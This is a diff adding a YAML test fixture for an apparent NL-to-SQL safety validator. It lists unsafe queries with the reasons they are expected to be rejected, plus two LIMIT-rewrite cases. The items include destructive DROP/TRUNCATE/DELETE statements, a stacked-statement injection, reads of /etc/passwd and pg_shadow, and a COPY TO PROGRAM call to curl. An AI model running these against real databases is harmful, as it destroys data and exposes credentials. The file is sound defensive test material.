@@ -1,0 +1,85 @@
+- id: nl2sql-unsafe-001
+  sql: DELETE FROM biz.orders
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-002
+  sql: UPDATE biz.orders SET status='cancelled'
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-003
+  sql: SELECT 1; DROP TABLE biz.orders
+  expected_reasons: [multiple_statements]
+- id: nl2sql-unsafe-004
+  sql: SELECT pg_read_file('/etc/passwd')
+  expected_reasons: [blocked_function]
+- id: nl2sql-unsafe-005
+  sql: SELECT * FROM public.users
+  expected_reasons: [table_not_allowed]
+- id: nl2sql-unsafe-006
+  sql: WITH x AS (DELETE FROM biz.orders RETURNING order_id) SELECT * FROM x
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-007
+  sql: INSERT INTO biz.orders(order_id) VALUES (99)
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-008
+  sql: DROP TABLE biz.orders
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-009
+  sql: CREATE TABLE biz.owned(i int)
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-010
+  sql: ALTER TABLE biz.orders ADD COLUMN owned int
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-011
+  sql: TRUNCATE biz.orders
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-012
+  sql: GRANT SELECT ON biz.orders TO public
+  expected_reasons: [write_operation]
+- id: nl2sql-unsafe-013
+  sql: SELECT * FROM pg_catalog.pg_user
+  expected_reasons: [table_not_allowed]
+- id: nl2sql-unsafe-014
+  sql: SELECT * FROM information_schema.columns
+  expected_reasons: [table_not_allowed]
+- id: nl2sql-unsafe-015
+  sql: SELECT * FROM biz.orders UNION SELECT * FROM pg_catalog.pg_shadow
+  expected_reasons: [table_not_allowed]
+- id: nl2sql-unsafe-016
+  sql: SELECT pg_sleep(60)
+  expected_reasons: [blocked_function]
+- id: nl2sql-unsafe-017
+  sql: SELECT set_config('statement_timeout','0',false)
+  expected_reasons: [blocked_function]
+- id: nl2sql-unsafe-018
+  sql: SELECT * FROM dblink('remote', 'SELECT 1') AS t(n int)
+  expected_reasons: [blocked_function]
+- id: nl2sql-unsafe-019
+  sql: SELECT * FROM biz.orders FOR UPDATE
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-020
+  sql: COPY biz.orders TO PROGRAM 'curl example.invalid'
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-021
+  sql: CREATE TEMP TABLE t AS SELECT * FROM biz.orders
+  expected_reasons: [write_operation]
+  database_read_only: true
+- id: nl2sql-unsafe-022
+  sql: SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM biz.orders) a) b) c) d) e) f) g) h) i) j) k
+  expected_reasons: [nesting_too_deep]
+- id: nl2sql-rewrite-001
+  sql: SELECT order_id FROM biz.orders LIMIT 9999999
+  max_rows: 10
+  expected_limit: 11
+- id: nl2sql-rewrite-002
+  sql: SELECT 1 AS n UNION ALL SELECT 2 AS n
+  max_rows: 10
+  expected_limit: 11
